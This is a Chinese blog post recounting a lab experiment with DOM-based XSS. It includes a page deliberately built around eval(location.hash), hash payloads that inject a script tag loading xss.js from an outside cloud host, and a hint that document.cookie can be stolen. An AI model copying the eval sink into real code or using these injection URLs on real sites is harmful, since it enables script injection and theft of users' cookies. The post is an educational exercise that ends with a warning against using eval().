---
title: 记一次简单的DOM XSS攻击实验
date: 
tags: 
---

之前就对XSS有所耳闻，不过昨天在学习《深入浅出nodejs》过程中，才深入了解到XSS攻击的原理，于是找到那本很早就想看的《web前端黑客技术解密》，找到 跨站攻击脚本XSS 章节，于是有了下面这个简单的XSS攻击实验。
####index.html
```
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>XSSdemo</title>
</head>
<script>
    eval(location.hash.substr(1))
</script>
<body>
	
</body>
</html>
```
关键代码：eval(location.hash.substr(1))

#### xss.js（XSS攻击脚本，存储在七牛云上：http://ov6jc8fwp.bkt.clouddn.com/xss.js）
```
alert("你的网站被XSS攻击了！")
```
关键代码：alert("你的网站被XSS攻击了！")
Cookie被经常当作输入点，可以使用escape(document.cookie)来获取用户Cookie中保存的敏感信息，例如电话号码，密码等等。

#### 如何进行攻击？
待访问文件xss.html的url上加上hash值。
`#document.write("<script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")`

例如：
file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write("<script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")

在真实环境中，这段file:///C:/Users/jack/Desktop/XSSdemo/可以是http://192.168.32.89:80/，http://192.16.32.89:8080/等真实地址。
完整形式如：http://192.16.32.89:8080/index.html#document.write("<script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")

#####可以攻击Chrome吗?
在Chrome中输入
>file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write(<script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")

会被Chrome拦截，拦截截图如下：

![](http://upload-images.jianshu.io/upload_images/2976869-05c2854c7a847abb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

为什么会被拦截？
因为Chrome 的filter防御机制会导致这个无法成功，其它浏览器可以被攻击。

#####那么如何攻击FireFox呢？
（浏览器版本为Firefox 57.0 Quantum版）
需要对原始攻击代码做下简单调整。
  `eval(decodeURI(location.hash.substr(1)))`
相应的访问链接也更改为`file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write(<script/src=http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")`

XSS攻击FireFox成功！
![](http://upload-images.jianshu.io/upload_images/2976869-b89a9ce80c02080e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
可以看到，XSS脚本被成功写入到index.html
![](http://upload-images.jianshu.io/upload_images/2976869-d9b4f6d08edfe148.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#####IE可以被攻击吗？
（浏览器版本为IE11.726.15063.0 ）
XSS攻击IE11成功！
![](http://upload-images.jianshu.io/upload_images/2976869-08bf2bb128a41f63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

攻击了这么久，难道我是要去绿，哦不，黑别人吗？
NoNoNo，我是为了让自己的网站更加安全。

之前有了解到javascript的eval()会有安全问题，通过今天的例子，才明白eval()原来会帮助 XSS攻击输入点代码进行攻击，例如：
本例中的输入点为location.hash.substr(1)，其值为'document.write(<script/src=http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")'

本质上eval(decodeURI(location.hash.substr(1)))
其实就是执行了eval'(document.write(`<script/src=http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")')

简单来说，**eval()会执行XSS跨站攻击脚本**，前端工程师在开发过程中要注意eval()使用存在的安全隐患。

对于浏览器喜爱程度，我想Chrome在防御XSS攻击方面又为自己加了不少分，以后强推Chrome又多了一个理由。

其实关于XSS攻击还有很多学问在其中，我所了解到的只是冰山一角，后续再继续探索！

That's it !